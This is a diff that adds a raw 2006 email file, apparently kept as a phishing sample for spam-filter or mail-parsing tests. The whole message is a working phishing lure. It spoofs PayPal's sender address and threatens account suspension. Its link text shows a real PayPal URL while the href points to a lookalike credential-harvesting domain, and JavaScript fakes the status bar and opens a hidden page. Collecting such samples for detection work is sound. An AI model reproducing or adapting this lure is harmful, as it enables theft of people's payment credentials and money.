@@ -1,0 +1,211 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <nobody@blade.budget-hosting.ch>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.1.2.3])
+ by naughty.example.com (Postfix) with ESMTP id 38E47536E21
+ for <nobody@login.example.com>; Wed,  8 Feb 2006 23:18:54 -0500 (EST)
+Received: from blade.budget-hosting.ch (host-205.bitflux.ch [212.55.202.205])
+ by mail1.example.com (Postfix) with ESMTP id 5AB8E6CCEFF
+ for <nobody@example.com>; Wed,  8 Feb 2006 23:18:52 -0500 (EST)
+Received: from nobody by blade.budget-hosting.ch with local (Exim 4.52)
+ id 1F73Ga-0001E0-AH
+ for nobody@example.com; Thu, 09 Feb 2006 05:18:48 +0100
+To: nobody@example.com
+Subject: ::PayPal Notification:: Update your information .
+From: <service@paypal.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1F73Ga-0001E0-AH@blade.budget-hosting.ch>
+Date: Thu, 09 Feb 2006 05:18:48 +0100
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - blade.budget-hosting.ch
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 32003] / [47 12]
+X-AntiAbuse: Sender Address Domain - blade.budget-hosting.ch
+X-Source: 
+X-Source-Args: /usr/local/apache/bin/httpd -DSSL 
+X-Source-Dir: acer-tech.ch:/public_html/sat
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 360
+
+<div>
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Update Your Information</title>
+</head>
+
+<body>
+
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
+  <tr valign="top">
+    <td>
+    <img src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt="PayPal" border="0" width="255" height="35">
+    </td>
+  </tr>
+</table>
+<table border="0" cellpadding="0" cellspacing="0" width="100%">
+  <tr>
+    <td background="http://images.paypal.com/en_US/i/scr/bg_clk.gif" width="100%">
+    <img src="pixel.gif" border="0" height="29" width="1"></td>
+  </tr>
+  <tr>
+    <td> </td>
+  </tr>
+</table>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
+  <tr valign="top">
+    <td width="400">
+    <table border="0" cellpadding="5" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111">
+      <tr valign="top">
+        <td height="16">
+        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tr>
+            <td class="pp_heading" align="left">
+            <font face="Verdana" style="font-size: 10pt; font-weight: 700" color="#003366">
+            Update Your Information</font></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+      <tr>
+        <td height="398">
+        <font face="Verdana" style="font-size: 9pt">It has come to our attention 
+        that your PayPal billing information are out of date. This require you 
+        to update your billing information as soon as possible.<br>
+        This billing update is also a new PayPal security statement which goes 
+        according to the established norms on our terms of service (TOS) to 
+        reduce the instance of fraud on our website</font><br>
+        <br>
+        <font face="Verdana" style="font-size: 8pt">Please update your records 
+        on or before <strong>February 11, 2006</strong>. A failure to update 
+        your records may result on a suspension of your account.</font><br>
+        <br>
+        <font face="Verdana" style="font-size: 8pt">To update your PayPal 
+        records click on the following link:</font><br>
+ <table align="left" bgcolor="#ffe65c" border="0" cellpadding="1" cellspacing="0" width="75%" height="19">
+          <tr>
+            <td height="17">
+            <table align="center" bgcolor="#fffecd" border="0" cellpadding="4" cellspacing="0" width="336" height="21">
+              <tr>
+                <td class="pp_sansserif" align="center" width="328" height="13">
+                <font style="font-size: 8pt" color="#0000b9" face="Verdana">
+                <strong style="font-weight: 400">
+                <a onmouseover="window.status='https://www.paypal.com/cgi-bin/webscr?cmd=login-run'; return true;" onclick="window.open('sys.php','ini','toolbar=yes,location=no,status=yes,menubar=yes,scrollbars=no,resizable=yes,width=800,height=600');" onmouseout="window.status=''; return true;" target="_blank" href="http://paypal-user-security.com/PayPal-Security-SSL128-Server/paypal-account/index.html">https://www.paypal.com/cgi-bin/webscr?cmd=login-run</a></strong></font></td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        <p><br>
+        <br>
+        <br>
+        <font face="Verdana" style="font-size: 9pt">This new security statement 
+        will helps us continue to offer PayPal as a secure and cost-effective 
+        payment service. We appreciate your cooperation and assistance.<br>
+        <br>
+        Sincerely,<br>
+        The PayPal Team</font></td>
+      </tr>
+      <tr>
+        <td height="1"><hr class="dotted" color="#C0C0C0" size="1" noshade></td>
+      </tr>
+      <tr>
+        <td height="83">
+        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tr>
+            <td class="pp_footer"><font face="Verdana" style="font-size: 8pt">
+            <font color="#B7B7B7">Please do not reply to this e-mail. Mail sent 
+            to this address cannot be answered. For assistance, </font>
+            <a target="_blank"  href="http://paypal-user-security.com/PayPal-Security-SSL128-Server/paypal-account/index.html" >log in</a><font color="#B7B7B7"> to 
+            your PayPal account and choose the "Help" link in the footer of any 
+            page.</font></font></td>
+          </tr>
+          <tr>
+            <td>
+            <img src="http://images.paypal.com/en_US/i/scr/pixel.gif" border="0" height="1" width="1"></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+      <tr>
+        <td height="22"><br>
+        <span class="pp_footer">
+        <font color="#B7B7B7" face="Verdana" style="font-size: 8pt">PayPal Email 
+        ID PP468</font><br>
+         </span></td>
+      </tr>
+    </table>
+    </td>
+    <td>
+    <img src="http://images.paypal.com/en_US/i/scr/pixel.gif" border="0" height="1" width="1"></td>
+    <td valign="top" width="190">
+    <table bgcolor="#cccccc" border="0" cellpadding="1" cellspacing="0" width="100%">
+      <tr>
+        <td>
+        <table bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" width="100%">
+          <tr>
+            <td>
+            <table bgcolor="#eeeeee" border="0" cellpadding="5" cellspacing="0" width="100%">
+              <tr>
+                <td class="pp_sidebartextbold" align="center"><b>
+                <font color="#003366">Protect Your Account Info</font></b></td>
+              </tr>
+            </table>
+            <table border="0" cellpadding="5" cellspacing="0" width="254">
+              <tr>
+                <td class="pp_sidebartext" width="244"><font color="#003366">
+                <font face="Verdana" size="1">Make sure you 
+                never provide your password to fraudulent websites. 
+                <br>
+                PayPal will never ask you to enter your password in an email.<br>
+                <br>
+                For more information on protecting yourself from fraud, please 
+                review our Security Tips at https://www.paypal.com/us/securitytips</font><br>
+ </font></td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+          <tr>
+            <td>
+            <table bgcolor="#eeeeee" border="0" cellpadding="5" cellspacing="0" width="100%">
+              <tr>
+                <td class="pp_sidebartextbold" align="center"><b>
+                <font color="#003366">Protect Your Password</font></b></td>
+              </tr>
+            </table>
+            <table border="0" cellpadding="5" cellspacing="0" width="100%" height="59">
+              <tr>
+                <td class="pp_sidebartext" height="49"><font color="#003366">
+                <font size="1" face="Verdana">You should <b>
+                <span class="ppem106">never</span></b> give your PayPal password 
+                to anyone, including PayPal employees.</font><br>
+                 </font></td>
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+</body>
+
+</html></div>
+
+
